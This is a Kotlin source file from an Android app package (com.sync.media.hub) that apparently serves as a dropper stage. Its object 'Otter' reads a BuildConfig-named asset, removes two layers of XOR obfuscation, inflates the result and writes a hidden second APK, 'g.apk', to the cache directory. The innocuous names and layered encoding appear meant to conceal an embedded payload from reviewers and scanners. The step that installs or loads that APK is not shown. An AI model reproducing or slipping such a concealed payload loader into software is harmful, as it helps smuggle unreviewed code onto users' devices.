package com.sync.media.hub

import android.content.Context
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.zip.Inflater

internal object Otter {

    fun extractGenome(ctx: Context): File {
        val key  = BuildConfig.HK
        val name = BuildConfig.CA

        val fileBytes = ctx.assets.open(name).readBytes()
        val magic = byteArrayOf(0xC9.toByte(), 0x3B, 0x7A, 0x4F)
        val enc  = if (fileBytes.size >= 8 && fileBytes[0] == magic[0] && fileBytes[1] == magic[1] &&
                       fileBytes[2] == magic[2] && fileBytes[3] == magic[3]) {
            val outerKey = fileBytes.sliceArray(4..7)
            ByteArray(fileBytes.size - 8) { i -> (fileBytes[i + 8].toInt() xor outerKey[i % 4].toInt()).toByte() }
        } else fileBytes
        val comp = ByteArray(enc.size) { i -> (enc[i].toInt() xor key[i % key.size].toInt()).toByte() }

        val inf = Inflater()
        inf.setInput(comp)
        val buf = ByteArrayOutputStream()
        val tmp = ByteArray(8192)
        while (!inf.finished()) {
            val n = inf.inflate(tmp)
            if (n > 0) buf.write(tmp, 0, n)
        }
        inf.end()
        val raw = buf.toByteArray()

        val out = File(ctx.cacheDir, "g.apk")
        out.writeBytes(raw)
        return out
    }
}
